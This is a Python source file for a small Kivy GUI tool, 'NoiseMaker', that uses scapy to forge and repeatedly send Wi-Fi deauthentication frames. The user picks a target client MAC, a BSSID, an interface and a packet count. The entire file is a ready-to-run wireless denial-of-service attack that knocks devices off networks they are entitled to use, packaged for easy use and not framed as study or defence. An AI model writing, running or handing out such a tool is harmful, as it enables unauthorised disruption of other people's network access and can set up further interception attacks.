import sys
from scapy.all import *

import kivy
kivy.require("1.9.0")
from kivy.app import App
from kivy.uix.gridlayout import GridLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.config import Config

Config.set('graphics','height','500')
Config.set('graphics','width','1000')
Config.set('graphics','resizable','0')



class NoiseMakerFunc(FloatLayout):
    def SendPacket (self):  
        try:
            client = self.ids.target.text
            nssid = self.ids.ssid.text
            count = self.ids.decount.text
            conf.iface = str(self.ids.iface.text)
            
            conf.verb = 0
            
            packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=nssid,addr3=nssid)/Dot11Deauth(reason=7)
            for n in range(int(count)):
                try:
                    sendp(packet)
                    print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + nssid + ' for Client: ' + client
                    self.ids.resultOutput.text = 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + nssid + ' for Client: ' + client
                except Exception, d:
                    print d
        except Exception, c:
            self.ids.resultOutput.text = "Error"
            print c
                
class NoiseMakerApp(App):

    def build(self):
        return NoiseMakerFunc()
    
NoiseMaker = NoiseMakerApp()
NoiseMaker.run()